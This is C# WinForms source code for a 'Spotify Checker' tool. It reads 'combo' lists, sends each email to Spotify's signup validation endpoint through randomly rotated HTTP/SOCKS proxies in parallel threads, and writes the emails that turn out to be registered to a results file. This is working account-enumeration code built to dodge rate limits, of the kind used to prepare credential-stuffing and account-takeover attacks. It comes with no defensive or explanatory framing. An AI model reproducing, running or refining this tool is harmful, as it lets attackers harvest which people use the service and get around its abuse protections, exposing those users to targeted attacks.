using Leaf.xNet;
using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Spotify_Checker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            Directory.CreateDirectory(Environment.CurrentDirectory + @"\\Results\\");
        }

        private void nsTheme1_Click(object sender, EventArgs e)
        {

        }

        public int good_count = 0;
        public int bad_count = 0;

        public int checked_count = 0;

        public int proxy_errors = 0;

        public string[] combos;
        public string[] proxies;

        string currentTime = DateTime.Now.ToString("dd-MM-yyyy hh-mm-ss");

        private void writeToFile(string email)
        {
            string fileName = Environment.CurrentDirectory + @"\\Results\\[GOOD]" + currentTime + ".txt";
            File.AppendAllText(fileName, email + Environment.NewLine);
        }

        private void Load_Combos(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Browse Combos";
            openFileDialog.Filter = "Combos|*.txt";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                combos = File.ReadAllLines(openFileDialog.FileName.ToString());
                ttl_Combos.Text = combos.Length.ToString();
            }
        }

        private void Load_Proxy(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Browse Proxies";
            openFileDialog.Filter = "Proxy|*.txt";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                proxies = File.ReadAllLines(openFileDialog.FileName.ToString());
                ttl_Proxy.Text = proxies.Length.ToString();
            }
        }

        public string randomProxy()
        {
            Random random = new Random();
            int index = random.Next(proxies.Length);

            return proxies[index];
        }

        private void checker(string email)
        {
            string url = $"https://spclient.wg.spotify.com/signup/public/v1/account?validate=1&email={email}";

            HttpRequest httpRequest = new HttpRequest();
            httpRequest.UserAgent = Http.ChromeUserAgent();

            while (true)
            {
                if (checkbox_http.Checked)
                    httpRequest.Proxy = HttpProxyClient.Parse(randomProxy());

                else if (checkbox_Socks4.Checked)
                    httpRequest.Proxy = Socks4ProxyClient.Parse(randomProxy());

                else if (checkbox_Socks5.Checked)
                    httpRequest.Proxy = Socks5ProxyClient.Parse(randomProxy());

                try
                {
                    string response = httpRequest.Get(url).ToString();

                    if (response.Contains("{\"status\":20"))
                    {
                        good_count += 1;
                        checked_count += 1;

                        ttl_Good.Text = good_count.ToString();
                        ttl_Checked.Text = checked_count.ToString();

                        string[] row = { email };
                        var listItem = new ListViewItem(row);
                        listView1.Items.Add(listItem);

                        writeToFile(email);
                        break;
                    }
                    else
                    {
                        bad_count += 1;
                        checked_count += 1;

                        ttl_Bad.Text = bad_count.ToString();
                        ttl_Checked.Text = checked_count.ToString();

                        break;
                    }
                }
                catch (HttpException ex)
                {
                    if (ex.Status.Equals(HttpExceptionStatus.ConnectFailure))
                    {
                        proxy_errors += 1;
                        ttl_Errors.Text = proxy_errors.ToString();
                    }
                }
            }
        }

        private void seperateThread()
        {
            Parallel.ForEach(

                   combos,
                   new ParallelOptions
                   {
                       MaxDegreeOfParallelism = Convert.ToInt32(numericUpDown1.Value)
                   },
                   combo =>
                   {
                       checker(combo);
                   }
            );
        }

        private void btn_Start(object sender, EventArgs e)
        {
            Thread thread = new Thread(seperateThread);
            thread.Start();
            thread.IsBackground = true;
        }
    }
}